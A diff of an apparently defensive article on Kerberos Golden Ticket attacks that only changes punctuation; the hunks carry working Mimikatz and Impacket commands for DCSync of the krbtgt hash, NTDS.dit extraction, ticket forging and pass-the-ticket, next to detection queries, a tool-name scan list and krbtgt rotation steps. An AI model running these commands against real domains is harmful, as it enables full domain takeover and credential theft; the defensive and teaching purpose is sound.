@@ -18,18 +18,18 @@ featured: false
 
 ## Definition
 
-A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the NTLM hash (or AES keys) of the **krbtgt** account — the domain's Kerberos Key Distribution Center service account. Because every legitimate TGT in the domain is encrypted and signed with the krbtgt key, possessing it allows forging universally valid TGTs for any user, with any group membership, with any validity period. It is the highest-privilege persistence mechanism in Active Directory.
+A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the NTLM hash (or AES keys) of the **krbtgt** account, the domain's Kerberos Key Distribution Center service account. Because every legitimate TGT in the domain is encrypted and signed with the krbtgt key, possessing it allows forging universally valid TGTs for any user, with any group membership, with any validity period. It is the highest-privilege persistence mechanism in Active Directory.
 
 ---
 
-## The Role of krbtgt — Why It Is the Crown Jewel
+## The Role of krbtgt, Why It Is the Crown Jewel
 
 The krbtgt account is created automatically when a domain is established. It has the following unique properties:
 
-- **Never used for interactive logon** — no one logs into a machine as krbtgt
-- **Password changes are controlled** — Windows never auto-rotates it (unlike computer accounts)
-- **Cryptographic root of trust** — all TGTs are encrypted and signed with its key
-- **Two versions of the hash are active simultaneously** — krbtgt keeps the current and previous password hash to support in-flight tickets during password changes
+- **Never used for interactive logon**, no one logs into a machine as krbtgt
+- **Password changes are controlled**, Windows never auto-rotates it (unlike computer accounts)
+- **Cryptographic root of trust**, all TGTs are encrypted and signed with its key
+- **Two versions of the hash are active simultaneously**, krbtgt keeps the current and previous password hash to support in-flight tickets during password changes
 
 These properties make krbtgt uniquely dangerous: if compromised, the entire Kerberos trust model for the domain is broken. Every TGT the domain has ever issued should be considered suspect.
 
@@ -46,7 +46,7 @@ When you rotate the krbtgt password, the old hash becomes the "previous" hash. T
 DCSync abuses Active Directory replication protocols. Any account with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights on the domain NC can pull password hashes from a DC without ever touching the DC's disk.
 
 ```cmd
-# Mimikatz — DCSync for krbtgt
+# Mimikatz, DCSync for krbtgt
 privilege::debug
 lsadump::dcsync /user:krbtgt /domain:domain.local
 
@@ -55,7 +55,7 @@ lsadump::dcsync /domain:domain.local /all /csv
 ```
 
 ```bash
-# Impacket — remote DCSync
+# Impacket, remote DCSync
 python3 secretsdump.py domain.local/DomainAdmin:password@dc01.domain.local \
   -just-dc-user krbtgt
 
@@ -88,7 +88,7 @@ reg save HKLM\SYSTEM C:\Temp\system.hive
 ```
 
 ```bash
-# Impacket — offline processing of NTDS.dit + SYSTEM hive
+# Impacket, offline processing of NTDS.dit + SYSTEM hive
 python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
 ```
 
@@ -103,7 +103,7 @@ python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
 | krbtgt NTLM hash | DCSync, LSASS, NTDS.dit |
 | Domain SID | `Get-ADDomain`, `whoami /user` |
 | Domain FQDN | Domain environment |
-| Username to impersonate | Any string — real or invented |
+| Username to impersonate | Any string, real or invented |
 
 ```powershell
 # Collect domain SID
@@ -126,7 +126,7 @@ kerberos::golden \
   /renewmax:10080 \
   /ptt
 
-# AES256-based (harder to detect — AES256 tickets are the new normal)
+# AES256-based (harder to detect, AES256 tickets are the new normal)
 kerberos::golden /user:FakeAdmin /domain:domain.local \
   /sid:S-1-5-21-XXX-XXX-XXX \
   /aes256:AES256KEYHERE \
@@ -151,7 +151,7 @@ kerberos::golden ... /ticket:C:\Temp\golden.kirbi
 ### Forging with Impacket (Linux C2)
 
 ```bash
-# ticketer.py — produce a .ccache file
+# ticketer.py, produce a .ccache file
 python3 ticketer.py \
   -nthash 9d765b482c0d55b5f7db2b154ef42ac9 \
   -domain-sid S-1-5-21-XXX-XXX-XXX \
@@ -171,7 +171,7 @@ python3 wmiexec.py -k -no-pass domain.local/FakeAdmin@anyserver.domain.local
 
 ## Security Problems
 
-**1. The entire domain is compromised.** A Golden Ticket provides access to every resource in the domain — DCs, file servers, email, databases, cloud synced accounts.
+**1. The entire domain is compromised.** A Golden Ticket provides access to every resource in the domain, DCs, file servers, email, databases, cloud synced accounts.
 
 **2. Password resets are ineffective.** Resetting the impersonated account's password does nothing. The Golden Ticket is signed by krbtgt, not the impersonated account. Only krbtgt rotation invalidates it.
 
@@ -181,7 +181,7 @@ python3 wmiexec.py -k -no-pass domain.local/FakeAdmin@anyserver.domain.local
 
 **5. Cross-realm attacks.** With inter-realm trust keys, Golden Tickets can be extended across forest trusts (trust ticket attacks). A compromised child domain can escalate to parent domain.
 
-**6. Remediation requires coordinated action.** Invalidating Golden Tickets requires two krbtgt password resets separated by at least 10 hours — a domain-wide operational event.
+**6. Remediation requires coordinated action.** Invalidating Golden Tickets requires two krbtgt password resets separated by at least 10 hours, a domain-wide operational event.
 
 **7. Undetectable without specialized tooling.** Standard DC event logs cannot distinguish a forged TGT from a legitimate one at authentication time.
 
@@ -211,7 +211,7 @@ MDI detects:
 Get-Service -Name AATPSensor -ComputerName dc01.domain.local
 ```
 
-### DCSync Detection — The Precursor
+### DCSync Detection, The Precursor
 
 Before forging a Golden Ticket, an attacker must obtain the krbtgt hash. DCSync is the most common method. Event ID 4662 on the DC captures this:
 
@@ -266,7 +266,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
 $maxAge = (Get-ADDefaultDomainPasswordPolicy).MaxTicketAge.TotalHours
 Write-Host "Max ticket age: $maxAge hours"
 
-# 4768 events contain ticket lifetime — compare against policy
+# 4768 events contain ticket lifetime, compare against policy
 # Standard: if lifetime requested > MaxTicketAge → suspicious
 Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
   Select-Object TimeCreated,
@@ -278,7 +278,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
 ### Detect NTDS.dit / VSS Access
 
 ```powershell
-# Sysmon Event 11 — file creation near NTDS.dit
+# Sysmon Event 11, file creation near NTDS.dit
 Get-WinEvent -FilterHashtable @{
   LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 11
 } | Where-Object {
@@ -303,13 +303,13 @@ Get-WinEvent -FilterHashtable @{
 
 ## Honeypot for krbtgt Detection
 
-There is no direct honeypot for Golden Ticket use — the forged ticket looks valid. However, you can create honeypot accounts whose names would appear in a forged PAC:
+There is no direct honeypot for Golden Ticket use, the forged ticket looks valid. However, you can create honeypot accounts whose names would appear in a forged PAC:
 
 ```powershell
 # Create a monitoring account that is never used legitimately
 New-ADUser -Name "svc_monitor_health" -SamAccountName "svc_monitor_health" `
   -AccountPassword (ConvertTo-SecureString "9!pK#4xM@2vN&7wQ^3rL*" -AsPlainText -Force) `
-  -Enabled $false   # disabled — should NEVER produce a logon event
+  -Enabled $false   # disabled, should NEVER produce a logon event
 
 # Any 4624 for this account (even with Enabled=$false, a forged Golden Ticket
 # with this username would still generate a logon event) is an immediate alert
@@ -321,7 +321,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
 
 ## How to Hunt It (Post-Incident)
 
-### Phase 1 — Verify krbtgt password age and rotation history
+### Phase 1, Verify krbtgt password age and rotation history
 
 ```powershell
 Get-ADUser -Identity krbtgt -Properties PasswordLastSet, PasswordNeverExpires,
@@ -335,7 +335,7 @@ $daysSinceReset    = ((Get-Date) - $krbtgt.PasswordLastSet).Days
 Write-Host "krbtgt created: $daysSinceCreation days ago | last password change: $daysSinceReset days ago"
 ```
 
-### Phase 2 — Audit DCSync permissions
+### Phase 2, Audit DCSync permissions
 
 ```powershell
 # Who has DS-Replication-Get-Changes-All on the domain NC?
@@ -351,7 +351,7 @@ $acl.Access | Where-Object {
 # Everything else should be investigated
 ```
 
-### Phase 3 — Look for known Golden Ticket tools on disk
+### Phase 3, Look for known Golden Ticket tools on disk
 
 ```powershell
 $suspiciousFiles = @('mimikatz*.exe', 'mimikatz*.dll', 'mimi32.exe',
@@ -371,7 +371,7 @@ foreach ($pattern in $suspiciousFiles) {
 
 ## How to Prevent It
 
-### 1. Protect Domain Controllers — krbtgt Can Only Be Stolen There
+### 1. Protect Domain Controllers, krbtgt Can Only Be Stolen There
 
 ```powershell
 # Audit who has Domain Admin (can DCSync, log onto DCs)
@@ -387,21 +387,21 @@ Get-ADGroupMember 'Domain Admins' -Recursive | Select-Object SamAccountName, obj
 # Download Microsoft's safe rotation script
 # https://github.com/microsoft/New-KrbtgtKeys.ps1
 
-# Simulation mode — shows what will happen without making changes
+# Simulation mode, shows what will happen without making changes
 .\New-KrbtgtKeys.ps1 -Mode Simulation -Scope AllDCs
 
-# Phase 1 rotation — execute on all DCs
+# Phase 1 rotation, execute on all DCs
 .\New-KrbtgtKeys.ps1 -Mode Reset -Scope AllDCs
 
 # WAIT: at least MaxTicketAge (default 10 hours) before Phase 2
 # This ensures all legitimate TGTs issued before Phase 1 expire naturally
 
-# Phase 2 rotation — invalidates tickets forged with Phase 1's hash
+# Phase 2 rotation, invalidates tickets forged with Phase 1's hash
 .\New-KrbtgtKeys.ps1 -Mode Reset -Scope AllDCs
 ```
 
 > [!IMPORTANT]
-> After Phase 1, some users may need to reauthenticate (if their TGTs were issued with the old hash and fall outside the 10-hour grace window). Plan this rotation for off-hours and communicate with users. Phase 2 is the critical step — without it, Golden Tickets using the Phase-1-era hash remain valid.
+> After Phase 1, some users may need to reauthenticate (if their TGTs were issued with the old hash and fall outside the 10-hour grace window). Plan this rotation for off-hours and communicate with users. Phase 2 is the critical step, without it, Golden Tickets using the Phase-1-era hash remain valid.
 
 ### 3. Audit and Restrict DCSync Rights
 
@@ -450,4 +450,4 @@ Tier 0 admins must only log onto Tier 0 machines (DCs, PAWs). If a Domain Admin 
 
 ## Conclusion
 
-The Golden Ticket is Active Directory's most severe persistence mechanism. Once the krbtgt hash is extracted, the attacker holds a master key valid for the entire domain's lifetime unless explicitly rotated. Defense requires protecting the domain controllers absolutely (they are the only source of the krbtgt hash), detecting the extraction event (DCSync), and accepting that post-extraction the response is: two krbtgt rotations, a full forensic review, and potentially a domain rebuild. Microsoft Defender for Identity is not optional for any environment that has a mature security posture — it is the detection tooling that makes Golden Ticket use visible.
+The Golden Ticket is Active Directory's most severe persistence mechanism. Once the krbtgt hash is extracted, the attacker holds a master key valid for the entire domain's lifetime unless explicitly rotated. Defense requires protecting the domain controllers absolutely (they are the only source of the krbtgt hash), detecting the extraction event (DCSync), and accepting that post-extraction the response is: two krbtgt rotations, a full forensic review, and potentially a domain rebuild. Microsoft Defender for Identity is not optional for any environment that has a mature security posture, it is the detection tooling that makes Golden Ticket use visible.
